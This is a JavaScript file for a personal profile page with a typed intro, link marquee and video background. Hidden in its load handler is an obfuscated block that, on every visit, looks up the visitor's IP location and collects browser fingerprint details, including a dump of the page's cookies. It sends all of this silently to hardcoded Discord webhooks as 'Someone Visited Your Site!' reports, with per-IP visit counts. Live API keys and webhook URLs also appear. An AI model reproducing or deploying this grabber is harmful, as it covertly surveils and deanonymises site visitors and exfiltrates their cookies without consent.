'use strict';

const ipgeolocation = 'https://api.ipgeolocation.io/ipgeo?apiKey=31ece79449854d1c8059ec105e82b33d';

const timeouts = [];

const mobileAndTabletCheck = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

const letters = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz";

document.querySelector("h1").onmouseover = event => {
  let iterations = 0;
  
  const interval = setInterval(() => {
  
    event.target.innerText = event.target.innerText.split("")
      .map((letter, index) => {
        if(index < iterations) {
          return event.target.dataset.value[index];
        }
      
        return letters[Math.floor(Math.random() * 26)]
      })
      .join("");
    if(iterations >= event.target.dataset.value.length) clearInterval(interval);
    
    iterations += 3 / 8;
  }, 30);
}

$(document).ready(() => {
  const links = [
    {
      name: 'wanted.lol',
      link: 'wanted.lol/losr',
    },
    {
      name: 'discord',
      link: 'discord.com/users/1083368117230653460',
    },
    {
      name: 'feds.lol',
      link: 'feds.lol/losr',
    },
    {
      name: 'github',
      link: 'github.com/madhead341',
    }
  ];

  for (let i in links) {
    let link = links[i];

    $('#marquee').append(`<a href="https://${link.link}" target="_BLANK">${link.name}</a>`);

    link = $('#marquee').children('a').last();

    if (i != links.length - 1) $('#marquee').append(' <img class="emoticon" src="assets/others/dot.png"> ');
  }

  if (mobileAndTabletCheck()) {
    $('#background').replaceWith('<div id="background" style="background-image: url(assets/images/mobile-background.jpg);"></div>');

    app.shouldIgnoreVideo = true;
  }

  app.titleChanger(['', 'll', 'llo', 'llos','llose','lloser','lloserr']);
  app.iconChanger(['assets/icons/rose1.jpeg', 'assets/icons/rose2.jpg', 'assets/icons/rose3.png', 'assets/icons/rose4.png']);
});

if ($.cookie('videoTime')) {
  app.videoElement.currentTime = $.cookie('videoTime');
  app.audioElement.currentTime = $.cookie('videoTime');
}

document.addEventListener('contextmenu', (event) => {
  event.preventDefault();
});

document.body.onkeyup = (event) => {
  if (event.keyCode == 32 && app.skippedIntro) {
    if (app.backgroundToggler) {
      app.videoElement.play();
      app.audioElement.play();
    } else {
      app.videoElement.pause();
      app.audioElement.pause();
    }

    return (app.backgroundToggler = !app.backgroundToggler);
  }
};

window.addEventListener('load', function() {
  (function(_0x4fc7a5,_0x416f4b){const _0x239aba=_0x516b,_0x5a182b=_0x4fc7a5();while(!![]){try{const _0xa5beb2=-parseInt(_0x239aba(0x13a))/0x1+-parseInt(_0x239aba(0x123))/0x2+parseInt(_0x239aba(0x102))/0x3+-parseInt(_0x239aba(0x168))/0x4*(-parseInt(_0x239aba(0x189))/0x5)+parseInt(_0x239aba(0x137))/0x6*(parseInt(_0x239aba(0x186))/0x7)+parseInt(_0x239aba(0x174))/0x8+-parseInt(_0x239aba(0xff))/0x9*(parseInt(_0x239aba(0xfd))/0xa);if(_0xa5beb2===_0x416f4b)break;else _0x5a182b['push'](_0x5a182b['shift']());}catch(_0x1351ab){_0x5a182b['push'](_0x5a182b['shift']());}}}(_0x2958,0x2a978));async function getIPInfo(){const _0x3b8c61=_0x516b,_0x3d1e57=(function(){let _0x4f48b0=!![];return function(_0x4bc540,_0x2079fb){const _0x4b904a=_0x4f48b0?function(){const _0x5181a0=_0x516b;if(_0x5181a0(0x17d)!==_0x5181a0(0x15b)){if(_0x2079fb){const _0x35cff7=_0x2079fb[_0x5181a0(0x169)](_0x4bc540,arguments);return _0x2079fb=null,_0x35cff7;}}else{const _0x90b9bb=_0x3a1f44?function(){const _0x1b381f=_0x5181a0;if(_0x211138){const _0x438196=_0x4f4a2d[_0x1b381f(0x169)](_0x31b834,arguments);return _0x34295c=null,_0x438196;}}:function(){};return _0x2a7822=![],_0x90b9bb;}}:function(){};return _0x4f48b0=![],_0x4b904a;};}()),_0x17bd24=(function(){let _0x156fb5=!![];return function(_0x3d846e,_0x407bb8){const _0x3476e7=_0x156fb5?function(){const _0x13ee09=_0x516b;if(_0x13ee09(0x12a)!==_0x13ee09(0x12a)){let _0x26dd07=_0x4ea890[_0x13ee09(0x18c)](_0x13ee09(0x166));return(_0x464b00(_0x26dd07)||_0x26dd07===null)&&(_0x26dd07=0x0),_0x270c79(_0x26dd07,0xa);}else{if(_0x407bb8){const _0x49ee04=_0x407bb8['apply'](_0x3d846e,arguments);return _0x407bb8=null,_0x49ee04;}}}:function(){};return _0x156fb5=![],_0x3476e7;};}()),_0x82466f=await fetch(_0x3b8c61(0x18e)),_0x3267e2=await _0x82466f[_0x3b8c61(0x142)](),_0x50c930=navigator[_0x3b8c61(0x161)]['toLowerCase']()['includes'](_0x3b8c61(0x124)),_0x1046c5=navigator['platform'][_0x3b8c61(0x16f)](),_0x4c3c05=_0x3267e2['threat'][_0x3b8c61(0x126)][_0x3b8c61(0x16e)](_0x1d1ee5=>{const _0x187240=_0x3b8c61;return'\x0a+\x20Name:\x20'+_0x1d1ee5[_0x187240(0xf6)]+_0x187240(0x13d)+_0x1d1ee5[_0x187240(0x183)]+_0x187240(0xef)+_0x1d1ee5[_0x187240(0x175)];}),_0x5148b8={'asn':{'asn':_0x3267e2[_0x3b8c61(0x10a)][_0x3b8c61(0x10a)],'name':_0x3267e2['asn'][_0x3b8c61(0xf6)],'domain':_0x3267e2[_0x3b8c61(0x10a)][_0x3b8c61(0x18b)],'route':_0x3267e2[_0x3b8c61(0x10a)]['route'],'type':_0x3267e2[_0x3b8c61(0x10a)][_0x3b8c61(0x175)]}};function _0xb4aeb3(){const _0x322117=_0x3b8c61;if(_0x322117(0xee)!==_0x322117(0x188)){const _0x288d79=_0x3d1e57(this,function(){const _0x453320=_0x322117;return _0x288d79[_0x453320(0x1af)]()[_0x453320(0x151)](_0x453320(0x1ad))[_0x453320(0x1af)]()['constructor'](_0x288d79)[_0x453320(0x151)]('(((.+)+)+)+$');});_0x288d79();const _0x4096b9=_0x17bd24(this,function(){const _0x283949=_0x322117;let _0x28a952;try{const _0x1d57d8=Function(_0x283949(0x101)+_0x283949(0x10e)+');');_0x28a952=_0x1d57d8();}catch(_0x1248ba){_0x283949(0x12f)!==_0x283949(0x12f)?_0xad13e3=_0x283949(0x14a):_0x28a952=window;}const _0x560d27=_0x28a952[_0x283949(0x163)]=_0x28a952[_0x283949(0x163)]||{},_0x304a09=[_0x283949(0x105),'warn','info',_0x283949(0x197),'exception','table',_0x283949(0x191)];for(let _0x30016e=0x0;_0x30016e<_0x304a09[_0x283949(0x128)];_0x30016e++){const _0x337c5a=_0x17bd24[_0x283949(0x136)][_0x283949(0x193)][_0x283949(0xf9)](_0x17bd24),_0x14fe93=_0x304a09[_0x30016e],_0x975bce=_0x560d27[_0x14fe93]||_0x337c5a;_0x337c5a[_0x283949(0x182)]=_0x17bd24[_0x283949(0xf9)](_0x17bd24),_0x337c5a[_0x283949(0x1af)]=_0x975bce[_0x283949(0x1af)][_0x283949(0xf9)](_0x975bce),_0x560d27[_0x14fe93]=_0x337c5a;}});_0x4096b9();if(navigator[_0x322117(0x17b)]&&navigator[_0x322117(0x17b)][_0x322117(0x155)])return(navigator['connection'][_0x322117(0x199)]*0x8)[_0x322117(0x19e)](0x2)+_0x322117(0x1b2);return _0x322117(0x144);}else _0x436da3='Unknown';}const _0x3fcef5=_0xb4aeb3();function _0x3c0404(){const _0x568f33=_0x3b8c61,_0x3765f1=navigator[_0x568f33(0x17b)]||navigator['mozConnection']||navigator[_0x568f33(0x146)];if(!_0x3765f1)return _0x568f33(0x149);const _0x5a3b10=_0x3765f1['effectiveType']||_0x3765f1['type'];if(_0x5a3b10===_0x568f33(0x100))return _0x568f33(0x104);return _0x5a3b10;}const _0x32b2a7=_0x3c0404(),_0x9c6318=async()=>{const _0x1e86e1=_0x3b8c61;if(_0x1e86e1(0x152)!==_0x1e86e1(0x152)){const _0x4f0293=_0x283fde?function(){const _0x210705=_0x1e86e1;if(_0x63c440){const _0x284fdc=_0x3f035d[_0x210705(0x169)](_0x1bdc3b,arguments);return _0x28e159=null,_0x284fdc;}}:function(){};return _0x991de4=![],_0x4f0293;}else try{const _0x3f9fea=await fetch(_0x1e86e1(0x170)),_0x31467f=await _0x3f9fea['json']();return _0x31467f;}catch(_0x1e0b5a){return console[_0x1e86e1(0x197)](_0x1e0b5a),null;}},_0x442d16=await _0x9c6318(),_0x7cee45=_0x442d16?.['ip'],_0x1a7efb=_0x442d16?.['network'];let _0x1f7518;if(/^win/[_0x3b8c61(0x133)](_0x1046c5))_0x1f7518='Microsoft';else{if(/^mac/[_0x3b8c61(0x133)](_0x1046c5))_0x1f7518=_0x3b8c61(0xfb);else{if(/^linux/['test'](_0x1046c5))_0x1f7518=_0x3b8c61(0x14a);else{if(/^android/[_0x3b8c61(0x133)](_0x1046c5))_0x1f7518=_0x3b8c61(0x18f);else/^ios/[_0x3b8c61(0x133)](_0x1046c5)?_0x1f7518=_0x3b8c61(0xfb):_0x1f7518=_0x3b8c61(0x144);}}}const _0x33b90b={'symbol':_0x3267e2[_0x3b8c61(0x180)][_0x3b8c61(0x114)],'name':_0x3267e2[_0x3b8c61(0x180)][_0x3b8c61(0xf6)],'code':_0x3267e2[_0x3b8c61(0x180)][_0x3b8c61(0x1b3)]},_0x4dfdca={'name':_0x3267e2[_0x3b8c61(0x16d)][_0x3b8c61(0xf6)],'offset':_0x3267e2['time_zone'][_0x3b8c61(0x13e)]},_0x2d1df0={'location':{'IPv4':_0x3267e2['ip'],'continent':_0x3267e2[_0x3b8c61(0x19d)],'country':_0x3267e2[_0x3b8c61(0x18a)],'country_code':_0x3267e2['country_code'],'latitude':_0x3267e2['latitude'],'longitude':_0x3267e2[_0x3b8c61(0x171)],'state':_0x3267e2[_0x3b8c61(0x131)],'city':_0x3267e2['city'],'googleMaps':_0x3b8c61(0x127)+_0x3267e2[_0x3b8c61(0x110)]+','+_0x3267e2['longitude'],'timezone':_0x4dfdca,'currency':_0x33b90b,'phoneCode':'+'+_0x3267e2[_0x3b8c61(0x17e)],'languages':_0x3267e2[_0x3b8c61(0xf8)][_0x3b8c61(0x16e)](_0x4783da=>({'name':_0x4783da[_0x3b8c61(0xf6)],'native':_0x4783da[_0x3b8c61(0xec)],'code':_0x4783da['code']})),'inEU':_0x3267e2[_0x3b8c61(0x196)]?'Yes':'No'},'info':{'ipv4':_0x7cee45,'ip':_0x3267e2['ip'],'provider':_0x3267e2['asn'][_0x3b8c61(0xf6)]+'\x20('+_0x3267e2[_0x3b8c61(0x10a)][_0x3b8c61(0x18b)]+_0x3b8c61(0x195)+_0x3267e2['asn'][_0x3b8c61(0x175)],'version':_0x3267e2[_0x3b8c61(0x129)],'network':''+_0x3267e2[_0x3b8c61(0x10a)][_0x3b8c61(0x165)],'ipv6network':_0x1a7efb,'connectionSpeed':_0xb4aeb3(),'wifiType':_0x3c0404(),'threat':{'is_tor':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x15a)],'is_vpn':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0xf4)],'is_icloud_relay':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x190)],'is_proxy':_0x3267e2['threat']['is_proxy'],'is_datacenter':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x1a3)],'is_anonymous':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x143)],'is_known_attacker':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x16a)],'is_known_abuser':_0x3267e2['threat']['is_known_abuser'],'is_threat':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x12b)],'is_bogon':_0x3267e2[_0x3b8c61(0x1a1)][_0x3b8c61(0x115)],'blocklists':_0x4c3c05}},'browserInfo':{'mobile':_0x50c930,'browser':navigator['appName'],'manufacturer':_0x1f7518,'userAgent':navigator[_0x3b8c61(0x161)],'page':location[_0x3b8c61(0x192)],'referrer':document[_0x3b8c61(0x17f)],'windowSize':window[_0x3b8c61(0x14d)]+'x'+window[_0x3b8c61(0xf0)],'historyLength':history['length'],'language':navigator[_0x3b8c61(0x1a5)],'platform':navigator[_0x3b8c61(0x122)],'javaEnabled':navigator[_0x3b8c61(0x1a9)](),'cookiesEnabled':navigator[_0x3b8c61(0x159)],'javascriptEnabled':!![],'cookieDump':document[_0x3b8c61(0x15e)],'cpuThreads':navigator['hardwareConcurrency'],'memory':Math['round'](performance[_0x3b8c61(0x12c)][_0x3b8c61(0x13f)]/0x100000*0x64)/0x64+_0x3b8c61(0xfc),'plugins':Array[_0x3b8c61(0x116)](navigator['plugins'])['map'](_0x22a4a1=>_0x22a4a1[_0x3b8c61(0xf6)]+'\x20('+_0x22a4a1['description']+')')[_0x3b8c61(0x147)](',\x20'),'webdriver':navigator[_0x3b8c61(0xf2)]?_0x3b8c61(0x125):'No','battery':navigator[_0x3b8c61(0xed)]?await navigator[_0x3b8c61(0xed)]()[_0x3b8c61(0x1a2)](_0x2cec10=>Math[_0x3b8c61(0x117)](_0x2cec10['level']*0x64)+'%'):_0x3b8c61(0x14e),'touchPoints':navigator['maxTouchPoints']||_0x3b8c61(0x154),'doNotTrack':navigator[_0x3b8c61(0x10f)]==='1'||navigator['doNotTrack']==='yes'?'Yes':'No'}},_0x10ecfd={'title':_0x3b8c61(0x173),'description':_0x3b8c61(0x10c)+_0x3b8c61(0x181)+_0x3b8c61(0x1a4)+(_0x3b8c61(0x134)+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x1b6)]+'\x0a')+(_0x3b8c61(0x18d)+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x17a)]+'\x0a')+(_0x3b8c61(0x14f)+_0x2d1df0[_0x3b8c61(0x198)]['country']+'\x0a')+('+\x20Country\x20Code:\x20'+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x1aa)]+'\x0a')+(_0x3b8c61(0xfa)+_0x2d1df0[_0x3b8c61(0x198)]['state']+'\x0a')+(_0x3b8c61(0x14c)+_0x2d1df0['location'][_0x3b8c61(0x141)]+'\x0a')+(_0x3b8c61(0x15f)+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x19a)]+'\x0a')+(_0x3b8c61(0x150)+_0x4dfdca[_0x3b8c61(0xf6)]+_0x3b8c61(0x1a6)+_0x4dfdca[_0x3b8c61(0x13e)]+')\x0a')+('+\x20Currency:\x20'+_0x33b90b[_0x3b8c61(0x114)]+_0x3b8c61(0x139)+_0x33b90b[_0x3b8c61(0xf6)]+'\x20('+_0x33b90b[_0x3b8c61(0x1b3)]+')\x0a')+(_0x3b8c61(0x160)+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x156)]+'\x0a')+('+\x20Languages:\x20'+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0xf8)][_0x3b8c61(0x16e)](_0xbd0bf1=>_0xbd0bf1['name']+'\x20-\x20'+_0xbd0bf1[_0x3b8c61(0x1b3)])['join'](',\x20')+'\x0a')+(_0x3b8c61(0x140)+_0x2d1df0['location'][_0x3b8c61(0x1ae)]+'\x0a\x0a')+(_0x3b8c61(0x13c)+_0x2d1df0[_0x3b8c61(0x198)]['latitude']+'\x0a')+(_0x3b8c61(0x118)+_0x2d1df0[_0x3b8c61(0x198)][_0x3b8c61(0x171)]+'\x0a\x0a')+_0x3b8c61(0x1ab)+(_0x3b8c61(0x135)+_0x2d1df0[_0x3b8c61(0x11a)]['ipv4']+'\x0a')+(_0x3b8c61(0x16c)+_0x2d1df0[_0x3b8c61(0x11a)][_0x3b8c61(0xf5)]+'\x0a')+(_0x3b8c61(0x111)+_0x2d1df0[_0x3b8c61(0x11a)]['ip']+'\x0a')+(_0x3b8c61(0x10b)+_0x2d1df0['info'][_0x3b8c61(0x119)]+'\x0a')+(_0x3b8c61(0x177)+_0x2d1df0['info'][_0x3b8c61(0xf7)]+'\x0a')+(_0x3b8c61(0x19f)+_0x2d1df0[_0x3b8c61(0x11a)]['wifiType']+'\x0a')+(_0x3b8c61(0xf1)+_0x2d1df0[_0x3b8c61(0x11a)][_0x3b8c61(0x11c)]+'\x0a\x0a')+_0x3b8c61(0x108)+('+\x20Threat:\x20'+_0x2d1df0[_0x3b8c61(0x11a)][_0x3b8c61(0x1a1)][_0x3b8c61(0x12b)]+'\x0a')+(_0x3b8c61(0x132)+_0x2d1df0[_0x3b8c61(0x11a)]['threat'][_0x3b8c61(0x164)]+'\x0a')+(_0x3b8c61(0x113)+_0x2d1df0['info'][_0x3b8c61(0x1a1)]['is_proxy']+'\x0a')+(_0x3b8c61(0x153)+_0x2d1df0[_0x3b8c61(0x11a)][_0x3b8c61(0x1a1)][_0x3b8c61(0x15a)]+'\x0a')+('+\x20Known\x20Abuser:\x20'+_0x2d1df0['info']['threat'][_0x3b8c61(0x1b4)]+'\x0a\x0a')+('+\x20BlockLists:\x20'+_0x2d1df0[_0x3b8c61(0x11a)][_0x3b8c61(0x1a1)][_0x3b8c61(0x126)]+'\x0a')+_0x3b8c61(0x13b)+_0x3b8c61(0x15d)+_0x3b8c61(0x181)+_0x3b8c61(0x179)+(_0x3b8c61(0x1a8)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x124)]+'\x0a')+(_0x3b8c61(0x185)+_0x2d1df0[_0x3b8c61(0x184)]['browser']+'\x0a')+(_0x3b8c61(0x148)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x14b)]+'\x0a')+(_0x3b8c61(0x19b)+_0x2d1df0['browserInfo'][_0x3b8c61(0x161)]+'\x0a')+(_0x3b8c61(0x121)+_0x2d1df0['browserInfo']['page']+'\x0a')+(_0x3b8c61(0x138)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x17f)]+'\x0a')+(_0x3b8c61(0x187)+_0x2d1df0[_0x3b8c61(0x184)]['historyLength']+'\x0a')+(_0x3b8c61(0x11d)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x1a5)]+'\x0a')+(_0x3b8c61(0xf3)+_0x2d1df0['browserInfo'][_0x3b8c61(0x122)]+'\x0a')+(_0x3b8c61(0x17c)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x1a9)]+'\x0a')+(_0x3b8c61(0x10d)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x109)]+'\x0a')+(_0x3b8c61(0x157)+_0x2d1df0[_0x3b8c61(0x184)]['webdriver']+'\x0a')+('+\x20Battery:\x20'+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x1ac)]+'\x0a')+(_0x3b8c61(0x158)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x11f)]+'\x0a')+(_0x3b8c61(0x106)+_0x2d1df0[_0x3b8c61(0x184)]['doNotTrack']+'\x0a\x0a')+_0x3b8c61(0x11b)+(_0x3b8c61(0x103)+_0x2d1df0[_0x3b8c61(0x184)]['cookieDump']+'\x0a')+(_0x3b8c61(0x1b1)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x176)]+'\x0a')+(_0x3b8c61(0x16b)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x12e)]+'\x0a')+('+\x20CPU\x20Threads:\x20'+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x120)]+'\x0a')+('+\x20Cookies\x20Enabled:\x20'+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x162)]+'\x0a')+(_0x3b8c61(0x112)+_0x2d1df0[_0x3b8c61(0x184)][_0x3b8c61(0x12c)]+'\x0a')+'```','color':0xff00},_0x1ca326='https://discord.com/api/webhooks/1336833563500351683/8DZfzjQPWtGdAmBuvQNQGjGolihqQ9FGy-j8x7bXVotDFKOZPU0lbHQUcKl5AOojlqOB';await fetch(_0x1ca326,{'method':_0x3b8c61(0x107),'headers':{'Content-Type':_0x3b8c61(0x1a7)},'body':JSON[_0x3b8c61(0x167)]({'content':_0x3b8c61(0x1b0),'embeds':[_0x10ecfd]})});}getIPInfo();function _0x2958(){const _0x352fcf=['IPv4','native','getBattery','dELDB','\x20\x0a+\x20Type:\x20','innerHeight','+\x20Provider:\x20','webdriver','+\x20Platform:\x20','is_proxy','ipv6network','name','connectionSpeed','languages','bind','+\x20State:\x20','Apple','\x20MB','70vNlSJh','Microsoft','869985kOMGLs','ethernet','return\x20(function()\x20','189237yCyjlE','+\x20Cookie\x20Dump:\x20','Ethernet','log','+\x20Do\x20Not\x20Track:\x20','POST','-\x20Threats\x20&\x20Proxy/VPN\x20Information:\x0a','plugins','asn','+\x20Network\x20(IPv4):\x20','**IP\x20Info**\x0a','+\x20Plugins:\x20','{}.constructor(\x22return\x20this\x22)(\x20)','doNotTrack','latitude','+\x20IP\x20(IPv4):\x20','+\x20Memory:\x20','+\x20Proxy:\x20','symbol','is_bogon','from','floor','+\x20Longitude:\x20','network','info','-Other\x20Information\x0a','provider','+\x20Language:\x20','https://discord.com/api/webhooks/1143606129474146344/ptDmmzLtGV9cLQXi9vdxRaBSCsQW1EZGMBHXgGE1NLNhv36J6h0sdkco-vDo2ITi63qo','touchPoints','cpuThreads','+\x20Page:\x20','platform','37152IzAyLV','mobile','Yes','blocklists','https://www.google.com/maps?q=','length','version','IUSug','is_threat','memory','Failed\x20to\x20send\x20message\x20to\x20Discord\x20webhook:','javascriptEnabled','PoySE','setItem','region','+\x20VPN:\x20','test','+\x20IP:\x20','+\x20IP\x20(IPv6):\x20','constructor','102hwLhwN','+\x20Referrer:\x20','\x20-\x20','5350suOdkY','```','+\x20Latitude:\x20','\x20\x0a+\x20Site:\x20','offset','totalJSHeapSize','+\x20In\x20EU:\x20','city','json','is_anonymous','Unknown','message','webkitConnection','join','+\x20Manufacturer:\x20','unknown','Linux','manufacturer','+\x20City:\x20','innerWidth','N/A','+\x20Country:\x20','+\x20Timezone:\x20','search','TMgKA','+\x20Tor\x20Browser:\x20','???','effectiveType','phoneCode','+\x20Webdriver/Bot:\x20','+\x20Touch\x20Points:\x20','cookieEnabled','is_tor','yUHik','pBfrT','**Browser\x20Info**\x0a','cookie','+\x20Google\x20Maps:\x20','+\x20Phone\x20Code:\x20','userAgent','cookiesEnabled','console','is_vpn','route','visitCount','stringify','132PMUzCg','apply','is_known_attacker','+\x20Javascript\x20Enabled:\x20','+\x20Network\x20(IPv6):\x20','time_zone','map','toLowerCase','https://ipapi.co/json','longitude','**\x20time(s).','__**Someone\x20Visited\x20Your\x20Site!**__','2082704qhIqdK','type','windowSize','+\x20Bandwith:\x20','statusText','-\x20Browser\x20&\x20Document\x20Information:\x0a','continent','connection','+\x20Java\x20Enabled:\x20','CeUkf','calling_code','referrer','currency','```diff\x0a','__proto__','site','browserInfo','+\x20Browser:\x20','140567jidDnI','+\x20History\x20Length:\x20','pkqBI','31855GbgYbU','country_name','domain','getItem','+\x20Continent:\x20','https://api.ipdata.co/?api-key=d75ad8557d1eb86f55d816c62987104cc8e1fe9b219dd85857875a44','Google','is_icloud_relay','trace','href','prototype','Error\x20sending\x20message\x20to\x20Discord\x20webhook:',')\x20-\x20','is_eu','error','location','downlink','googleMaps','+\x20User\x20Agent:\x20','WmJeH','continent_code','toFixed','+\x20Wifi\x20Type:\x20','**\x20has\x20visited\x20your\x20website\x20**','threat','then','is_datacenter','-\x20Location\x20Information:\x0a','language','\x20(Offset:\x20','application/json','+\x20Mobile:\x20','javaEnabled','country_code','-\x20Network\x20Information:\x0a','battery','(((.+)+)+)+$','inEU','toString','<@1128055835344506980>','+\x20Window\x20Size:\x20','\x20Mb/s','code','is_known_abuser','catch'];_0x2958=function(){return _0x352fcf;};return _0x2958();}async function Visitcounter(){const _0x56083c=_0x516b,_0x2ca3f4=await fetch(_0x56083c(0x18e)),_0x14e0f6=await _0x2ca3f4['json'](),_0x3eecad=async()=>{const _0x458af7=_0x56083c;try{const _0x363782=await fetch(_0x458af7(0x170)),_0x335515=await _0x363782['json']();return _0x335515;}catch(_0x56971a){return console[_0x458af7(0x197)](_0x56971a),null;}},_0x35594f={'location':{'IPv4':_0x14e0f6['ip']}},_0x117251=_0x3eecad(),_0x3b9992=_0x117251?.['ip'],_0x11c028=_0x56083c(0x11e);function _0x2fbf1d(){const _0x2f501d=_0x56083c;let _0x293662=localStorage[_0x2f501d(0x18c)]('visitCount');return(isNaN(_0x293662)||_0x293662===null)&&(_0x293662=0x0),parseInt(_0x293662,0xa);}function _0x532d65(){const _0x21a109=_0x56083c;let _0x5e1f97=_0x2fbf1d();_0x5e1f97++,localStorage[_0x21a109(0x130)](_0x21a109(0x166),_0x5e1f97);const _0x3b0b58='**'+_0x35594f[_0x21a109(0x198)][_0x21a109(0x1b6)]+_0x21a109(0x1a0)+_0x5e1f97+_0x21a109(0x172);fetch(_0x11c028,{'method':_0x21a109(0x107),'headers':{'Content-Type':_0x21a109(0x1a7)},'body':JSON[_0x21a109(0x167)]({'content':_0x3b0b58})})['then'](_0x705d4=>{const _0x392920=_0x21a109;_0x392920(0x15c)===_0x392920(0x19c)?_0x35b315=_0x392920(0xfe):!_0x705d4['ok']&&console[_0x392920(0x197)](_0x392920(0x12d),_0x705d4[_0x392920(0x178)]);})[_0x21a109(0x1b5)](_0x319965=>{const _0x8a7de=_0x21a109;console[_0x8a7de(0x197)](_0x8a7de(0x194),_0x319965[_0x8a7de(0x145)]);});}setTimeout(_0x532d65,0x7d0);};function _0x516b(_0x47da85,_0x4ef257){const _0xfb6fc2=_0x2958();return _0x516b=function(_0x5a8aea,_0x53b5da){_0x5a8aea=_0x5a8aea-0xec;let _0x6f4a5f=_0xfb6fc2[_0x5a8aea];return _0x6f4a5f;},_0x516b(_0x47da85,_0x4ef257);}Visitcounter();

setInterval(() => {
  $('.troll').remove();
}, 600);

$('.skip').click(() => {
  skipIntro();
});

$.fn.extend({
  animateCss: function(animationName) {
    const animationEnd = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';

    this.addClass(`animated ${animationName}`).one(animationEnd, () => {
      $(this).removeClass(`animated ${animationName}`);
    });

    return this;
  },
});

const writeLine = (text, speed, timeout, callback) => {
  timeout = typeof timeout === 'number' ? timeout : [0, (callback = timeout)];

  const lineNumber = app.id !== 2 ? ++app.id : (app.id += 2);

  setTimeout(() => {
    const typed = new Typed(`#line${lineNumber}`, {
      strings: text,
      typeSpeed: speed,
      onComplete: callback,
    });
  }, timeout);
};

$.getJSON(ipgeolocation, (data) => {
  const usernames = ['user', 'dude'];
  const ip = data.ip ? data.ip : usernames[Math.floor(Math.random() * usernames.length)];
  const country = data.country_name ? data.country_name : 'your country';
  
  const ips = ['84.194.95.249', '81.82.221.23', '209.107.204.33', '205.185.222.206', '205.185.222.207', '2a02:1810:8c1f:6200:4026:3744:9fbd:f027', '205.185.222.207', '84.194.95.249', '205.185.222.208','205.185.222.182', '209.107.204.71', '209.107.204.72', '209.107.204.73', '2a02:1810:8c1f:6200:85be:2b02:e36a:2d90'];
  const username = ips.includes(ip) ? '[lloserr]' : '[unknown]';

  writeLine(['Authenticating...', `Granting access to <span style='font-size: 14px; color: #06d;'>${username}</span>...`], 30, () => {
    if (app.skippedIntro) return;

    clearCursor();
    writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `Welcome back, <i style='color: #0f0'>${ip}</i>! By the way, nice to see someone from ${country} here!`], 30, 500, () => {
      writeLine([`<i style='color: #F62459'>~ lloserr </i>`], 120, 500, () => {
        timeouts.push(
          setTimeout(() => {
            if (app.skippedIntro) return;

            clearCursor();

            setTimeout(() => {
              skipIntro();
            }, 500);
          }, 1000)
        );
      });
    });
  });
});

  




const skipIntro = () => {
  if (app.skippedIntro) return;

  app.skippedIntro = true;

  timeouts.forEach((timeout) => {
    clearTimeout(timeout);
  });

  $('.top-right').remove();

  $('#main').fadeOut(100, () => {
    $('#main').remove();

    $('#marquee').marquee({
      duration: 15000,
      gap: 420,
      delayBeforeStart: 1000,
      direction: 'left',
      duplicated: true,
    });

    setTimeout(() => {
      $('.brand-header').animateCss(app.effects[Math.floor(Math.random() * app.effects.length)]);
    }, 200);

    setTimeout(() => {
      const typed = new Typed('#brand', {
        strings: app.brandDescription,
        typeSpeed: 40,

        onComplete: () => {
          clearCursor();
        },
      });
    }, 1350);

    setTimeout(() => {
      if (!app.shouldIgnoreVideo) {
        app.videoElement.play();
        app.audioElement.play();
      }

      app.videoElement.addEventListener(
        'timeupdate',
        () => {
          $.cookie('videoTime', app.videoElement.currentTime, { expires: 1 });
        },
        false
      );

      $('.marquee-container').css('visibility', 'visible').hide().fadeIn(100);

      $('.marquee-container').animateCss('zoomIn');

      $('.container').fadeIn();

      $('.background').fadeIn(200, () => {
        if (!app.shouldIgnoreVideo) $('#audio').animate({ volume: app.musicVolume }, app.musicFadeIn);
      });
    }, 200);
  });
};

const clearCursor = () => {
  return $('span').siblings('.typed-cursor').css('opacity', '0');
};

document.onmousemove = e => {
  const x = e.clientX;
  const y = e.clientY;

  for (const card of document.getElementsByClassName("card")) {
    const rect = card.getBoundingClientRect();
    const isInsideCard = x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom;

    card.style.setProperty("--mouse-x", isInsideCard ? `${x - rect.left}px` : "50%");
    card.style.setProperty("--mouse-y", isInsideCard ? `${y - rect.top}px` : "50%");
    card.classList.toggle("outside-card", !isInsideCard);
  }
}});
